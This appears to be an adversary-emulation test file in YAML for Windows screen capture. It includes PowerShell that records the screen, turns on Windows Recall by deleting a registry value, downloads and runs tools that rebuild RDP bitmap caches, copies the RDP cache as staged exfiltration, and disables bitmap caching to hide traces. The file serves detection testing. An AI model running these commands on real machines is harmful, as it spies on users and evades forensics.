- name: Windows Screencapture
  auto_generated_guid: 3c898f62-626c-47d5-aad2-6de873d69153
  description: |
    Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Output file path
      type: path
      default: c:\temp\T1113_desktop.zip
    recording_time:
      description: Time to take screenshots
      type: integer
      default: 5
  executor:
    name: powershell
    elevation_required: false
    command: |
      cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
      Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
      [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
      cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
    cleanup_command: |
      rm #{output_file} -ErrorAction Ignore
- name: Windows Screen Capture (CopyFromScreen)
  auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
  description: |
    Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
    [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path where captured results will be placed
      type: path
      default: $env:TEMP\T1113.png
  executor:
    command: |
      Add-Type -AssemblyName System.Windows.Forms
      $screen = [Windows.Forms.SystemInformation]::VirtualScreen
      $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
      $graphic = [Drawing.Graphics]::FromImage($bitmap)
      $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
      $bitmap.Save("#{output_file}")
    cleanup_command: |
      Remove-Item #{output_file} -ErrorAction Ignore
    name: powershell
- name: Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted
  auto_generated_guid: 5a496325-0115-4274-8eb9-755b649ad0fb
  description: |-
    Detects the enabling of the Windows Recall feature via registry manipulation. Windows Recall can be enabled by deleting the existing "DisableAIDataAnalysis" registry value. Adversaries may enable Windows Recall as part of post-exploitation discovery and collection activities. This rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary. 
    - https://learn.microsoft.com/en-us/windows/client-management/manage-recall
    - https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowsai#disableaidataanalysis
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f
      reg delete "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /f
    cleanup_command: |
      reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f
    name: powershell
    elevation_required: true
- name: RDP Bitmap Cache Extraction via BMC-Tools (Real - Python)
  auto_generated_guid: 6c28d27f-9c09-40e1-fbda-3d3f9453716c
  description: |
    Simulates an attacker extracting the RDP bitmap cache using the OFFICIAL ANSSI bmc-tools.py script.
    Note: Since this is a Python script, the process name will be 'python.exe', not 'bmc-tools.exe'.
  supported_platforms:
  - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      $url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'
      $toolsDir = "$env:TEMP\bmc-tools.py"
      $outputDir = "$env:TEMP\rdp_screens"
      
      # FIX 1: Create the output directory before running the tool
      New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

      # Download official Python script
      & curl.exe -L $url --output $toolsDir
      
      # Execute with Python (Assumes python is in PATH, which is true for GitHub Runners)
      if (Test-Path $toolsDir) { python $toolsDir -s 600 -b -d $outputDir }
    cleanup_command: |
      Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue
      Remove-Item "$env:TEMP\rdp_screens" -Recurse -Force -ErrorAction SilentlyContinue

- name: RDP Bitmap Cache Stitching via RDPCacheStitcher (Real - Exe)
  auto_generated_guid: 9a3c1c72-8f12-4c6e-931b-27c1a2e3f4b5
  description: |
    Alternative method using RDPCacheStitcher.exe (BSI-Bund) to reconstruct RDP cache files.
    Downloads the official ZIP release, extracts it, and runs the executable.
  supported_platforms:
  - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      # FIX 2: Updated URL to v1.0 which is the standard known release
      $url = 'https://github.com/BSI-Bund/RdpCacheStitcher/releases/download/v1.0/RdpCacheStitcher_v1.0.zip'
      $zipPath = "$env:TEMP\RdpCacheStitcher.zip"
      $extractPath = "$env:TEMP\RdpCacheStitcher"
      $cachePath = "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache"
      $output = "$env:TEMP\RDP_stitcher_output"

      # Download official ZIP
      & curl.exe -L $url --output $zipPath
      
      # Extract ZIP
      Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
      
      # Locate and Run Exe (The internal folder structure might vary, so we find the .exe)
      $exe = Get-ChildItem -Path $extractPath -Filter "RdpCacheStitcher.exe" -Recurse | Select-Object -ExpandProperty FullName -First 1
      if ($exe) { & $exe -p $cachePath -o $output }
    cleanup_command: |
      Remove-Item "$env:TEMP\RdpCacheStitcher.zip" -ErrorAction SilentlyContinue
      Remove-Item "$env:TEMP\RdpCacheStitcher" -Recurse -Force -ErrorAction SilentlyContinue

- name: Exfiltrate RDP Cache Directory (Living off the Land)
  auto_generated_guid: 12f5c942-3e21-4a1b-9f21-789a2b1c4d3e
  description: |
    Simulates an attacker manually copying the RDP cache folder for offline analysis using Robocopy.
    This avoids dropping new binaries but generates suspicious file access events.
  supported_platforms:
  - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      $source = "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache"
      $dest = "$env:TEMP\RDP_Cache_Exfil"
      
      # Robocopy /E copies subdirectories, including empty ones
      # Robocopy returns distinct exit codes for success (1), so we suppress errors to prevent Atomic failure alerts on success
      try { robocopy $source $dest /E } catch { }
    cleanup_command: |
      Remove-Item "$env:TEMP\RDP_Cache_Exfil" -Recurse -Force -ErrorAction SilentlyContinue

- name: Disable RDP Bitmap Caching (Defense Evasion)
  auto_generated_guid: 52a1b5c0-1234-5678-90ab-cdef12345678
  description: |
    Disables RDP Bitmap Caching via the Registry to prevent future forensic artifacts from being created.
    Attackers may do this after exfiltration to leave no traces of future sessions.
  supported_platforms:
  - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      $regPath = "HKCU:\Software\Microsoft\Terminal Server Client"
      if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
      Set-ItemProperty -Path $regPath -Name "DisableBitmapCaching" -Type DWORD -Value 1 -Force
    cleanup_command: |
      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client" -Name "DisableBitmapCaching" -ErrorAction SilentlyContinue
